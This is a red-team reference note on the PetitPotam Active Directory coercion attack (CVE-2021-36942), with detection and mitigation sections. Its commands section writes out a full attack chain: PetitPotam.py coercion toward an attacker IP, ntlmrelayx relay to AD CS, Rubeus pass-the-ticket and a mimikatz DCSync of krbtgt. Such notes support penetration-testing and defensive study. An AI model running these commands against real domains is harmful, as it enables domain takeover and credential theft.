---
title: PetitPotam
aliases: ["CVE-2021-36942", "EfsRpcOpenFileRaw", "PetitPotam attack"]
type: technique
domain: [red-team, active-directory]
attack_tactic: [credential-access, privesc]
tags: [type/technique, domain/red-team, attack/credential-access, cve]
source: "Gilles Lionel (topotam)"
source_url: "https://github.com/topotam/PetitPotam"
verified: true
related: ["[[NTLM Relay]]", "[[AD Certificate Services Abuse (ESC1-ESC8)]]", "[[Domain Controller (DC)]]", "[[NTLM Authentication]]"]
created: 2026-06-07
updated: 2026-06-07
---

# PetitPotam (CVE-2021-36942)

> [!summary] One-liner
> An unauthenticated coercion attack that forces a Domain Controller to authenticate to an attacker-controlled host via the EFS RPC interface — typically chained with [[NTLM Relay]] to [[AD Certificate Services Abuse (ESC1-ESC8)|AD CS]] (ESC8) for instant domain compromise.

## Concept abused
The **Encrypting File System Remote Protocol (MS-EFSRPC)** exposes RPC functions like `EfsRpcOpenFileRaw` that cause the target machine to make an outbound SMB connection (carrying its [[NTLM Authentication|NTLM]] credentials) to a UNC path the attacker specifies. The DC authenticates as its machine account — the attacker relays this to a vulnerable service.

## The classic chain: PetitPotam + NTLM Relay + AD CS
```
Attacker                    DC                      AD CS (Web Enrollment)
   │                         │                              │
   ├─ EfsRpcOpenFileRaw ────►│                              │
   │  (UNC: \\attacker\x)    │                              │
   │                         ├─ SMB connect ──────────────►│
   │◄─ NTLM auth (DC$) ─────┤                              │
   │                         │                              │
   ├─ Relay NTLM to AD CS ──────────────────────────────────►│
   │  (request cert as DC$)  │                              │
   │◄─ DC certificate ───────────────────────────────────────┤
   │                         │                              │
   └─ Use cert for DCSync    │                              │
```

## Prerequisites
- Network access to the target DC (TCP 445 for MS-EFSRPC via named pipe `\pipe\efsrpc` or `\pipe\lsarpc`).
- **Unauthenticated** in the original disclosure; Microsoft's patch requires authentication for some pipes, but authenticated coercion still works.
- An [[NTLM Relay]] target — most commonly AD CS Web Enrollment (ESC8) with NTLM auth enabled.

## Commands & tools

### PetitPotam (coerce authentication)
```bash
# Unauthenticated (unpatched targets)
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# Authenticated (patched targets — still works with creds)
python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>
```

### Chain with ntlmrelayx + AD CS
```bash
# Start relay targeting AD CS web enrollment
ntlmrelayx.py -t http://<ADCS_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# After receiving the DC certificate (base64):
# Use Rubeus to request a TGT with the cert
Rubeus.exe asktgt /user:<DC_NAME>$ /certificate:<BASE64_CERT> /ptt

# DCSync with the DC's TGT
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

### Coercer (multi-protocol coercion)
```bash
# Test all coercion methods (PetitPotam, PrinterBug, ShadowCoerce, etc.)
Coercer scan -t <DC_IP> -u <USER> -p <PASS> -d <DOMAIN>

# Coerce via specific method
Coercer coerce -t <DC_IP> -l <ATTACKER_IP> -u <USER> -p <PASS> -d <DOMAIN> --filter-method-name EfsRpcOpenFileRaw
```

## Detection / artifacts
- Outbound SMB connections **from a DC** to unexpected hosts (DCs should not be initiating SMB to workstations).
- Certificate enrollment events for machine accounts (AD CS Event 4886/4887).
- Named pipe access to `\pipe\efsrpc` or `\pipe\lsarpc` from external IPs.
- [[NTLM Relay]] artifacts on the relay target.

## Mitigation
- **Patch**: KB5005413 (August 2021) — requires authentication for EFS RPC.
- **Disable NTLM on DCs** or at minimum enable **EPA (Extended Protection for Authentication)** on AD CS web enrollment.
- **Disable AD CS HTTP enrollment** if not needed; switch to HTTPS with EPA.
- Enable **SMB signing** (required on DCs by default — but relay targets may not require it).
- Monitor and restrict outbound SMB from DCs.

## Related
- Relay mechanics: [[NTLM Relay]], [[NTLM Authentication]].
- Relay target: [[AD Certificate Services Abuse (ESC1-ESC8)]] (ESC8 — HTTP enrollment relay).
- Similar coercion: [[PrintNightmare]] (PrinterBug/SpoolSample).
- Target: [[Domain Controller (DC)]].

## Sources
- Gilles Lionel (topotam) — PetitPotam PoC (July 2021).
- CVE-2021-36942.
